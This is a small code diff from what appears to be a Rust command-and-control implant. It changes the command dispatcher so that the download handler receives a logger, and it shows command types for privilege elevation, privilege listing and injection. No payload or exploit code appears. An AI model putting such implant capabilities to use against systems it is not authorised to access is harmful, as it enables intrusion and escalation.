@@ -100,7 +100,7 @@ impl NotionCommand {
     pub async fn handle(&self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
             CommandType::Cd(s)       => cd::handle(&s),
-            CommandType::Download(s) => download::handle(&s).await,
+            CommandType::Download(s) => download::handle(&s, logger).await,
             CommandType::Elevate(s)  => elevate::handle(&s, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
             CommandType::Inject(s)   => inject::handle(&s, logger).await,
